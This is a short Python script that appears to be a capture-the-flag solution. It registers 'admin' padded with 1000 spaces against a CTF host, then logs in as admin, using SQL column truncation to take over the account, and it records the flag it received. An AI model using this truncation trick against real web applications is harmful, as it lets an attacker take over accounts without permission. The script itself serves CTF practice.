#!/usr/bin/python
# coding: utf-8

import requests

url = "http://burger.laboratorium.ee:8002/"


data = {
    'action': 'register',
    'username': 'admin' + ' ' * 1000 + 'a',
    'password': 'admin123$'
}

r = requests.post(url, data=data)


data = {
    'action': 'login',
    'username': 'admin',
    'password': 'admin123$'
}

r = requests.post(url, data=data)

print r.text

"""
Congratulations! Flag is ad0f46b77ae29d84a5f2b3a9b0784853d2aee093
"""